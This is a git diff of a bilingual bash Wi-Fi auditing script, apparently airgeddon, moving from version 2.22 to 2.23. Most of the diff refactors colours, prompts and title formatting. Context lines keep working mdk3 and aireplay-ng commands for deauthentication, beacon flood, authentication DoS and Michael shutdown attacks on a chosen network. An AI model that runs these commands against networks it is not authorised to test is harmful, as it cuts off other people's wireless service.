@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="2.22"
+version="2.23"
 
 #Change these lines to select another default language
 language="english"
@@ -12,14 +12,14 @@ mail="v1s1t0r.1sh3r3@gmail.com"
 tools=(iwconfig awk rfkill airmon-ng airodump-ng aireplay-ng mdk3)
 
 #Colors
-green_color="\033[0;32m"
-magenta_color="\033[0;35m"
-white_color="\033[0;37m"
-grey_color="\033[0;37m"
-red_color="\033[0;31m"
-blue_color="\033[0;34m"
-yellow_color="\033[0;33m"
-normal_color="\e[0m"
+green_color="\033[1;32m"
+magenta_color="\033[1;35m"
+white_color="\033[1;37m"
+grey_color="\033[1;37m"
+red_color="\033[1;31m"
+blue_color="\033[1;34m"
+yellow_color="\033[1;33m"
+normal_color="\e[1;0m"
 
 function language_strings() {
 
@@ -369,6 +369,15 @@ function language_strings() {
 	arr["english",114]="Use it only on your own networks!!"
 	arr["spanish",114]="Utilízalo solo en tus propias redes!!"
 
+	arr["english",115]="Press [Enter] key to continue..."
+	arr["spanish",115]="Pulse la tecla [Enter] para continuar..."
+
+	arr["english",116]="Press [Enter] key to start attack..."
+	arr["spanish",116]="Pulse la tecla [Enter] para comenzar el ataque..."
+
+	arr["english",117]="Select target network :"
+	arr["spanish",117]="Selecciona la red objetivo :"
+
 	case "$3" in
 		"yellow")
 			echo_yellow "${arr[$1,$2]}"
@@ -377,29 +386,16 @@ function language_strings() {
 			echo_blue "${arr[$1,$2]}"
 		;;
 		"red")
-			ncharstitle=80
-			titlechar="*"
-			titletext="${arr[$1,$2]}"
-			titlelength=${#titletext}
-			finaltitle=""
-
-			for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
-				finaltitle="$finaltitle$titlechar"
-			done
-
-			finaltitle+="$titletext"
-
-			for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
-				finaltitle="$finaltitle$titlechar"
-			done
-
-			if [ $(($titlelength % 2)) -gt 0 ]; then
-				finaltitle+="$titlechar"
-			fi
-			echo_red "$finaltitle"
+			echo_red "${arr[$1,$2]}"
 		;;
 		"green")
 			echo_green "${arr[$1,$2]}"
+		;;
+		"titlered")
+			generate_title "${arr[$1,$2]}" "red"
+		;;
+		"read")
+			read -p "${arr[$1,$2]}"
 		;;
 		*)
 			echo "${arr[$1,$2]}"
@@ -407,47 +403,43 @@ function language_strings() {
 	esac
 }
 
-function do_read() {
+function generate_title() {
 
-	case "$language" in
-		"spanish")
-			read -p "Pulse la tecla [Enter] para continuar..."
+	ncharstitle=78
+	titlechar="*"
+	titletext=$1
+	titlelength=${#titletext}
+	finaltitle=""
+
+	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
+		finaltitle="$finaltitle$titlechar"
+	done
+
+	finaltitle="$finaltitle $titletext "
+
+	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
+		finaltitle="$finaltitle$titlechar"
+	done
+
+	if [ $(($titlelength % 2)) -gt 0 ]; then
+		finaltitle+="$titlechar"
+	fi
+
+	case "$2" in
+		"yellow")
+			echo_yellow "$finaltitle"
 		;;
-		"english")
-			read -p "Press [Enter] key to continue..."
+		"red")
+			echo_red "$finaltitle"
+		;;
+		"blue")
+			echo_blue "$finaltitle"
+		;;
+		"green")
+			echo_green "$finaltitle"
 		;;
 		*)
-			read -p "Press [Enter] key to continue..."
-		;;
-	esac
-}
-
-function do_select_target_read() {
-
-	case "$language" in
-		"spanish")
-			read -p "Selecciona la red objetivo : " select
-		;;
-		"english")
-			read -p "Select target network : " select
-		;;
-		*)
-			read -p "Select target network : " select
-		;;
-	esac
-}
-
-function do_attack_read() {
-
-	case "$language" in
-		"spanish")
-			read -p "Pulse la tecla [Enter] para comenzar el ataque..."
-		;;
-		"english")
-			read -p "Press [Enter] key to start attack..."
-		;;
-		*)
-			read -p "Press [Enter] key to start attack..."
+			echo -e "$finaltitle"
 		;;
 	esac
 }
@@ -459,18 +451,17 @@ function check_to_set_managed() {
 		"Managed")
 			echo
 			language_strings $language 0 "yellow"
-			do_read
+			language_strings $language 115 "read"
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
 			language_strings $language 1 "yellow"
-			do_read
+			language_strings $language 115 "read"
 			return 1
 		;;
 	esac
 	return 0
-
 }
 
 function check_to_set_monitor() {
@@ -480,13 +471,13 @@ function check_to_set_monitor() {
 		"Monitor")
 			echo
 			language_strings $language 10 "yellow"
-			do_read
+			language_strings $language 115 "read"
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
 			language_strings $language 13 "yellow"
-			do_read
+			language_strings $language 115 "read"
 			return 1
 		;;
 	esac
@@ -500,7 +491,7 @@ function check_monitor_enabled() {
 	if [[ $mode != "Monitor" ]]; then
 		echo
 		language_strings $language 14 "yellow"
-		do_read
+		language_strings $language 115 "read"
 		return 1
 	fi
 	return 0
@@ -538,7 +529,7 @@ function managed_option() {
 
 	echo
 	language_strings $language 16 "yellow"
-	do_read
+	language_strings $language 115 "read"
 }
 
 function monitor_option() {
@@ -558,7 +549,7 @@ function monitor_option() {
 	if [ "$?" != "0" ]; then
 		echo
 		language_strings $language 20 "yellow"
-		do_read
+		language_strings $language 115 "read"
 		return
 	fi
 
@@ -576,7 +567,7 @@ function monitor_option() {
 
 	echo
 	language_strings $language 22 "yellow"
-	do_read
+	language_strings $language 115 "read"
 }
 
 function check_interface_mode() {
@@ -610,14 +601,14 @@ function check_interface_mode() {
 	fi
 
 	language_strings $language 23 "yellow"
-	do_read
+	language_strings $language 115 "read"
 	exit_script_option
 }
 
 function language_option() {
 
 	clear
-	language_strings $language 87 "red"
+	language_strings $language 87 "titlered"
 	language_strings $language 81 "green"
 	echo
 	language_strings $language 79
@@ -628,12 +619,12 @@ function language_option() {
 		1)
 			language="english"
 			language_strings $language 83 "yellow"
-			do_read
+			language_strings $language 115 "read"
 		;;
 		2)
 			language="spanish"
 			language_strings $language 84 "yellow"
-			do_read
+			language_strings $language 115 "read"
 		;;
 		*)
 			invalid_language_selected
@@ -644,13 +635,12 @@ function language_option() {
 function select_interface() {
 
 	clear
-	language_strings $language 88 "red"
+	language_strings $language 88 "titlered"
 	language_strings $language 24 "green"
 	echo
 	ifaces=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2|awk {'print $1'}|grep lo -v`
 	option_counter=0
-	for item in $ifaces
-	do
+	for item in $ifaces; do
 		option_counter=$[option_counter + 1]
 		echo "$option_counter. $item"
 	done
@@ -661,8 +651,7 @@ function select_interface() {
 			invalid_iface_selected
 		else
 			option_counter2=0
-			for item2 in $ifaces
-			do
+			for item2 in $ifaces; do
 				option_counter2=$[option_counter2 + 1]
 				if [[ "$iface" = "$option_counter2" ]]; then
 					interface=$item2
@@ -730,7 +719,7 @@ function ask_essid() {
 function exec_mdk3deauth() {
 
 	echo
-	language_strings $language 89 "red"
+	language_strings $language 89 "titlered"
 	language_strings $language 32 "green"
 
 	rm -rf /tmp/bl.txt > /dev/null 2>&1
@@ -738,76 +727,76 @@ function exec_mdk3deauth() {
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 amok attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
 }
 
 function exec_aireplaydeauth() {
 
 	echo
-	language_strings $language 90 "red"
+	language_strings $language 90 "titlered"
 	language_strings $language 32 "green"
 
 	$airmon start $interface $channel > /dev/null 2>&1
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
 }
 
 function exec_wdsconfusion() {
 
 	echo
-	language_strings $language 91 "red"
+	language_strings $language 91 "titlered"
 	language_strings $language 32 "green"
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "wids / wips / wds confusion attack" -e mdk3 $interface w -e $essid -c $channel
 }
 
 function exec_beaconflood() {
 
 	echo
-	language_strings $language 92 "red"
+	language_strings $language 92 "titlered"
 	language_strings $language 32 "green"
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "beacon flood attack" -e mdk3 $interface b -n $essid -c $channel -s 1000 -h
 }
 
 function exec_authdos() {
 
 	echo
-	language_strings $language 93 "red"
+	language_strings $language 93 "titlered"
 	language_strings $language 32 "green"
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "auth dos attack" -e mdk3 $interface a -a $bssid -m -s 1024
 }
 
 function exec_michaelshutdown() {
 
 	echo
-	language_strings $language 94 "red"
+	language_strings $language 94 "titlered"
 	language_strings $language 32 "green"
 
 	echo
 	language_strings $language 33 "blue"
-	do_attack_read
+	language_strings $language 116 "read"
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "michael shutdown attack" -e mdk3 $interface m -t $bssid -w 1 -n 1024 -s 1024
 }
 
 function mdk3_deauth_option() {
 
 	echo
-	language_strings $language 95 "red"
+	language_strings $language 95 "titlered"
 	language_strings $language 35 "green"
 
 	check_monitor_enabled
@@ -826,7 +815,7 @@ function mdk3_deauth_option() {
 function aireplay_deauth_option() {
 
 	echo
-	language_strings $language 96 "red"
+	language_strings $language 96 "titlered"
 	language_strings $language 36 "green"
 
 	check_monitor_enabled
@@ -845,7 +834,7 @@ function aireplay_deauth_option() {
 function wds_confusion_option() {
 
 	echo
-	language_strings $language 97 "red"
+	language_strings $language 97 "titlered"
 	language_strings $language 37 "green"
 
 	check_monitor_enabled
@@ -864,7 +853,7 @@ function wds_confusion_option() {
 function beacon_flood_option() {
 
 	echo
-	language_strings $language 98 "red"
+	language_strings $language 98 "titlered"
 	language_strings $language 38 "green"
 
 	check_monitor_enabled
@@ -883,7 +872,7 @@ function beacon_flood_option() {
 function auth_dos_option() {
 
 	echo
-	language_strings $language 99 "red"
+	language_strings $language 99 "titlered"
 	language_strings $language 39 "green"
 
 	check_monitor_enabled
@@ -901,7 +890,7 @@ function auth_dos_option() {
 function michael_shutdown_option() {
 
 	echo
-	language_strings $language 100 "red"
+	language_strings $language 100 "titlered"
 	language_strings $language 40 "green"
 
 	check_monitor_enabled
@@ -921,7 +910,7 @@ function print_selections() {
 	if [ -z "$interface" ]; then
 		language_strings $language 41 "blue"
 		echo
-		do_read
+		language_strings $language 115 "read"
 		select_interface
 		menu_options
 	else
@@ -947,7 +936,7 @@ function print_selections() {
 function menu_options() {
 
 	clear
-	language_strings $language 101 "red"
+	language_strings $language 101 "titlered"
 	current_menu="main"
 	print_selections
 	echo
@@ -1015,7 +1004,7 @@ function menu_options() {
 function old_attacks_menu() {
 
 	clear
-	language_strings $language 102 "red"
+	language_strings $language 102 "titlered"
 	current_menu="old"
 	print_selections
 	echo
@@ -1082,7 +1071,7 @@ function old_attacks_menu() {
 function explore_neighbourhood_option() {
 
 	echo
-	language_strings $language 103 "red"
+	language_strings $language 103 "titlered"
 	language_strings $language 65 "green"
 
 	check_monitor_enabled
@@ -1094,7 +1083,7 @@ function explore_neighbourhood_option() {
 	language_strings $language 66 "yellow"
 	echo
 	language_strings $language 67 "yellow"
-	do_read
+	language_strings $language 115 "read"
 
 	rm -rf /tmp/nws* > /dev/null 2>&1
 	rm -rf /tmp/clts.csv > /dev/null 2>&1
@@ -1109,7 +1098,7 @@ function explore_neighbourhood_option() {
 	if [ $csvline -le 3 ]; then
 		echo
 		language_strings $language 68 "yellow"
-		do_read
+		language_strings $language 115 "read"
 		return
 	fi
 
@@ -1150,7 +1139,7 @@ function explore_neighbourhood_option() {
 function select_target() {
 
 	clear
-	language_strings $language 104 "red"
+	language_strings $language 104 "titlered"
 	language_strings $language 69
 	echo_blue "-------------------------------------------------------"
 	i=0
@@ -1199,31 +1188,33 @@ function select_target() {
 	echo
 	if [ $i -eq 1 ]; then
 		language_strings $language 70 "yellow"
-		select=1
-		do_read
+		select_target_network=1
+		language_strings $language 115 "read"
 	else
 		language_strings $language 71
 		echo_blue "-------------------------------------------------------"
 		echo
-		do_select_target_read
+		language_strings $language 117 "green"
+		read selected_target_network
 	fi
 
-	while [[ $select -lt 1 ]] || [[ $select -gt $i ]]; do
+	while [[ $selected_target_network -lt 1 ]] || [[ $selected_target_network -gt $i ]]; do
 		echo
 		language_strings $language 72 "yellow"
 		echo
-		do_select_target_read
+		language_strings $language 117 "green"
+		read selected_target_network
 	done
 
-	essid=${network_names[$select]}
-	channel=${channels[$select]}
-	bssid=${macs[$select]}
+	essid=${network_names[$selected_target_network]}
+	channel=${channels[$selected_target_network]}
+	bssid=${macs[$selected_target_network]}
 }
 
 function credits_option() {
 
 	clear
-	language_strings $language 105 "red"
+	language_strings $language 105 "titlered"
 	language_strings $language 73 "green"
 	echo -e $blue_color"       ____        ____  __   _______"
 	echo -e "___  _/_   | _____/_   |/  |_ \   _  \_______"
@@ -1246,7 +1237,7 @@ function credits_option() {
 	echo
 	language_strings $language 85 "green"
 	language_strings $language 107 "green"
-	do_read
+	language_strings $language 115 "read"
 }
 
 function invalid_language_selected() {
@@ -1254,7 +1245,7 @@ function invalid_language_selected() {
 	echo
 	language_strings $language 82 "yellow"
 	echo
-	do_read
+	language_strings $language 115 "read"
 	echo
 	language_option
 }
@@ -1263,7 +1254,7 @@ function invalid_menu_option() {
 
 	echo
 	language_strings $language 76 "yellow"
-	do_read
+	language_strings $language 115 "read"
 }
 
 function invalid_iface_selected() {
@@ -1271,7 +1262,7 @@ function invalid_iface_selected() {
 	echo
 	language_strings $language 77 "yellow"
 	echo
-	do_read
+	language_strings $language 115 "read"
 	echo
 	select_interface
 }
@@ -1282,7 +1273,7 @@ function killing_script() {
 	echo
 	language_strings $language 12 "yellow"
 	echo
-	do_read
+	language_strings $language 115 "read"
 
 	if [ "$current_menu" = "main" ]; then
 		menu_options
@@ -1294,7 +1285,7 @@ function killing_script() {
 function exit_script_option() {
 
 	echo
-	language_strings $language 106 "red"
+	language_strings $language 106 "titlered"
 	language_strings $language 11 "blue"
 	echo
 	exit
@@ -1354,7 +1345,7 @@ function detect_distro() {
 		return
 	fi
 
-	do_read
+	language_strings $language 115 "read"
 	exit_script_option
 }
 
@@ -1371,7 +1362,7 @@ function check_compatibility() {
 
 	language_strings $language 5 "yellow"
 	language_strings $language 108 "yellow"
-	do_read
+	language_strings $language 115 "read"
 	echo
 	language_strings $language 109 "blue"
 	toolsok=1
@@ -1407,7 +1398,7 @@ function welcome() {
 
 	clear
 	current_menu="main"
-	language_strings $language 86 "red"
+	language_strings $language 86 "titlered"
 	language_strings $language 6 "blue"
 	echo
 	language_strings $language 7 "green"
@@ -1417,7 +1408,7 @@ function welcome() {
 	language_strings $language 9 "blue"
 	echo
 	detect_distro
-	do_read
+	language_strings $language 115 "read"
 
 	select_interface
 	menu_options
@@ -1425,30 +1416,22 @@ function welcome() {
 
 function echo_green() {
 
-	tput setaf 2; tput setab 0;
-	echo $*
-	tput sgr0
+	echo -e $green_color"$*"$normal_color
 }
 
 function echo_blue() {
 
-	tput setaf 4; tput setab 0;
-	echo $*
-	tput sgr0
+	echo -e $blue_color"$*"$normal_color
 }
 
 function echo_yellow() {
 
-	tput setaf 3; tput setab 0;
-	echo $*
-	tput sgr0
+	echo -e $yellow_color"$*"$normal_color
 }
 
 function echo_red() {
 
-	tput setaf 1; tput setab 0;
-	echo $*
-	tput sgr0
+	echo -e $red_color"$*"$normal_color
 }
 
 trap killing_script INT
